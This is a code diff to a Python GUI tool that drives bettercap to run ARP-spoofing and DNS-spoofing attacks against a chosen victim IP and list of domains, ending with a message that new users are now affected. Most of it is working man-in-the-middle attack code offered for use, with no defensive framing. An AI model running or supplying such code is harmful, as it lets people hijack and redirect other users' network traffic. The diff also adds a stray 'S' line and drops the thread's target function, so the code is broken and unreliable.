@@ -44,7 +44,7 @@ def stopDnsSpoofing() :
         errorOutputLabel["text"] += traceback.format_exc()
     except Exception as e:
         errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
-
+S
 def runDnsSpoofing() :
     global dnsSpoofingThreads, dnsSpoofingIsRunning
     dnsSpoofingIsRunning = True
@@ -58,27 +58,18 @@ def dnsSpoofHub(interface, victimIp, victimDomains):
 
     process = subprocess.Popen(["bettercap", "-iface", interface], 
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    runBettercapThread = threading.Thread(target=reader, args=(process,))
+    runBettercapThread = threading.Thread(args=(process,))
     runBettercapThread.start()
 
-    commands = ["help", "net.probe on", "help", "net.show", "set arp.spoof.fullduplex true",
+    commands = ["net.probe on", "set arp.spoof.fullduplex true",
                 spoofTargets, "arp.spoof on", "set dns.spoof.all true",
                 spoofDomains, "dns.spoof on"]
     for command in commands:
-        terminalLabel["text"] += f"Executing command : {command}"
+        terminalLabel["text"] += f"\nExecuting command : {command}\n"
         process.stdin.write(f"{command}\n".encode())
         process.stdin.flush()
 
         # Give it some time to process the command and generate output
         time.sleep(2)
-
-def reader(proc):
-    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    while True:
-        output = proc.stdout.readline().decode('utf8', errors='strict')
-        if output == '' and proc.poll() is not None:
-            terminalLabel["text"] += "\n"
-            break
-        if output:
-            ansiStripOutput = ansi_escape.sub('', output)
-            terminalLabel["text"] += "$ " + ansiStripOutput.strip() + "\n"
+    
+    terminalLabel["text"] += "\n$ DNS Spoofing Attack executed! New users will now be affected!\n"
